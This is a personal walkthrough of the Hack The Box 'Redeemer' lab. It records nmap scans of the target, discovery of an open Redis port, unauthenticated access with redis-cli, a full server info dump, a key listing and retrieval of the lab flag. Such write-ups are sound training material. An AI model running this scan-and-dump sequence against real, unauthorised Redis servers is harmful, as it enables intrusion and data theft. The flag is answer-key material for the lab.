# HTB Redeemer
Starting Point

2024-11-11

Target IP - 10.129.136.187

Redis - 'In-memory' database

# Enumeration
Scanned with nmap.
No ports shown on initial scan.
Host stopped responding to nmap after initial scan.
Used -Pn flag to complete scan.

	┌─[us-starting-point-1-dhcp]─[10.10.15.82]─[jcaruso@htb-ovilbvmvlt]─[~]
	└──╼ [★]$ nmap -sV 10.129.136.187
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 11:16 CST
	Nmap scan report for 10.129.136.187
	Host is up (0.0096s latency).
	All 1000 scanned ports on 10.129.136.187 are in ignored states.
	Not shown: 1000 closed tcp ports (reset)

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds

	┌─[us-starting-point-1-dhcp]─[10.10.15.82]─[jcaruso@htb-ovilbvmvlt]─[~]
	└──╼ [★]$ nmap -sV 10.129.136.187
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 11:18 CST
	Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
	Nmap done: 1 IP address (0 hosts up) scanned in 3.16 seconds

	┌─[us-starting-point-1-dhcp]─[10.10.15.82]─[jcaruso@htb-ovilbvmvlt]─[~]
	└──╼ [★]$ nmap -Pn -p 1-65535 10.129.136.187
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 11:18 CST
	Nmap scan report for 10.129.136.187
	Host is up (0.0086s latency).
	Not shown: 65424 closed tcp ports (reset), 110 filtered tcp ports (no-response)
	PORT     STATE SERVICE
	6379/tcp open  redis

	Nmap done: 1 IP address (1 host up) scanned in 29.12 seconds

## Port Found
6379/tcp open  redis

## Connect to redis database
	redis-cli -h 10.129.136.187

## Get list of keys
	KEYS *

Machine has gone offline. Resetting machine.
Connected but lost connection again.
Reset machine again.
Connected but lost connection again.
Problem appears to be with using Pwnbox. Switched to using kali in WSL on my machine.

Connected to redis database at new target IP:
	redis-cli -h 10.129.76.86

	┌──(lith㉿DESKTOP-921J5TE)-[~]
	└─$ redis-cli -h 10.129.76.86
	
## Get redis database info	
	10.129.76.86:6379> info
	# Server
	redis_version:5.0.7
	redis_git_sha1:00000000
	redis_git_dirty:0
	redis_build_id:66bd629f924ac924
	redis_mode:standalone
	os:Linux 5.4.0-77-generic x86_64
	arch_bits:64
	multiplexing_api:epoll
	atomicvar_api:atomic-builtin
	gcc_version:9.3.0
	process_id:751
	run_id:352611c0231b36e86bbc20adada7b941553d9d48
	tcp_port:6379
	uptime_in_seconds:763
	uptime_in_days:0
	hz:10
	configured_hz:10
	lru_clock:3293749
	executable:/usr/bin/redis-server
	config_file:/etc/redis/redis.conf

	# Clients
	connected_clients:1
	client_recent_max_input_buffer:2
	client_recent_max_output_buffer:0
	blocked_clients:0

	# Memory
	used_memory:859624
	used_memory_human:839.48K
	used_memory_rss:5804032
	used_memory_rss_human:5.54M
	used_memory_peak:859624
	used_memory_peak_human:839.48K
	used_memory_peak_perc:100.12%
	used_memory_overhead:846142
	used_memory_startup:796224
	used_memory_dataset:13482
	used_memory_dataset_perc:21.26%
	allocator_allocated:1570200
	allocator_active:1892352
	allocator_resident:9101312
	total_system_memory:2084024320
	total_system_memory_human:1.94G
	used_memory_lua:41984
	used_memory_lua_human:41.00K
	used_memory_scripts:0
	used_memory_scripts_human:0B
	number_of_cached_scripts:0
	maxmemory:0
	maxmemory_human:0B
	maxmemory_policy:noeviction
	allocator_frag_ratio:1.21
	allocator_frag_bytes:322152
	allocator_rss_ratio:4.81
	allocator_rss_bytes:7208960
	rss_overhead_ratio:0.64
	rss_overhead_bytes:-3297280
	mem_fragmentation_ratio:7.10
	mem_fragmentation_bytes:4986416
	mem_not_counted_for_evict:0
	mem_replication_backlog:0
	mem_clients_slaves:0
	mem_clients_normal:49694
	mem_aof_buffer:0
	mem_allocator:jemalloc-5.2.1
	active_defrag_running:0
	lazyfree_pending_objects:0

	# Persistence
	loading:0
	rdb_changes_since_last_save:4
	rdb_bgsave_in_progress:0
	rdb_last_save_time:1731346234
	rdb_last_bgsave_status:ok
	rdb_last_bgsave_time_sec:-1
	rdb_current_bgsave_time_sec:-1
	rdb_last_cow_size:0
	aof_enabled:0
	aof_rewrite_in_progress:0
	aof_rewrite_scheduled:0
	aof_last_rewrite_time_sec:-1
	aof_current_rewrite_time_sec:-1
	aof_last_bgrewrite_status:ok
	aof_last_write_status:ok
	aof_last_cow_size:0

	# Stats
	total_connections_received:5
	total_commands_processed:6
	instantaneous_ops_per_sec:0
	total_net_input_bytes:306
	total_net_output_bytes:11572
	instantaneous_input_kbps:0.00
	instantaneous_output_kbps:0.00
	rejected_connections:0
	sync_full:0
	sync_partial_ok:0
	sync_partial_err:0
	expired_keys:0
	expired_stale_perc:0.00
	expired_time_cap_reached_count:0
	evicted_keys:0
	keyspace_hits:0
	keyspace_misses:0
	pubsub_channels:0
	pubsub_patterns:0
	latest_fork_usec:0
	migrate_cached_sockets:0
	slave_expires_tracked_keys:0
	active_defrag_hits:0
	active_defrag_misses:0
	active_defrag_key_hits:0
	active_defrag_key_misses:0

	# Replication
	role:master
	connected_slaves:0
	master_replid:9eed2cc0c60552ffc9bf5245b5c025bb0c843856
	master_replid2:0000000000000000000000000000000000000000
	master_repl_offset:0
	second_repl_offset:-1
	repl_backlog_active:0
	repl_backlog_size:1048576
	repl_backlog_first_byte_offset:0
	repl_backlog_histlen:0

	# CPU
	used_cpu_sys:0.950799
	used_cpu_user:0.866520
	used_cpu_sys_children:0.000000
	used_cpu_user_children:0.000000

	# Cluster
	cluster_enabled:0

	# Keyspace
	db0:keys=4,expires=0,avg_ttl=0
	(0.96s)

4 keys found

## Enumerating keys
	10.129.76.86:6379> keys *
	1) "flag"
	2) "temp"
	3) "numb"
	4) "stor"

# Flag Captured
	10.129.76.86:6379> get flag
	"03e1d2b376c37ab3f5319922053953eb"


